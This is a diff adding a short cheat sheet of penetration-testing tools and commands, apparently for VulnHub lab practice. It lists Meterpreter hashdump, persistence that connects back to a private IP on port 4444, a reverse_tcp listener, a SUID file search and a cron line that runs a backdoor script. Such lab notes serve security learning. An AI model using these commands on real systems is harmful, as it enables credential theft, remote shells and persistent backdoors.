@@ -1,1 +1,22 @@
+##Tools Used
+Tool	                 	 Purpose	                                        Platform
+LinPEAS	    	           Linux privilege escalation enumeration         	Linux
+PowerSploit		           PowerShell post-exploitation framework         	Windows
+Meterpreter		           Metasploit payload for post-exploitation	        Cross-platform
+Metasploit		           Exploitation framework	                          Kali Linux
+VulnHub VM	             Various	Practice environments                 	Virtual Machine
+Linux Exploit Suggester	 Kernel exploit identification                  	Linux
 
+
+##Commands Used
+Tool	            Command	                                            Purpose
+LinPEAS	          ./linpeas.sh -a                                    	Full privilege escalation scan
+LinPEAS	          ./linpeas.sh -s                                    	Quick enumeration
+Meterpreter	      getsystem            	                              Attempt automatic privilege escalation
+Meterpreter	      hashdump	                                          Dump password hashes
+Meterpreter	      persistence -U -X -i 60 -p 4444 -r 192.168.1.100	  Set up persistence
+Metasploit	      use exploit/multi/handler	                          Start listener
+Metasploit	      set payload linux/x64/meterpreter/reverse_tcp	      Set payload
+Linux	find         / -perm -4000 2>/dev/null	                        Find SUID files
+Linux	crontab     -l	                                                List cron jobs 
+Linux	echo        "* * * * * /tmp/backdoor.sh" > /tmp/cronjob	        Create malicious cron
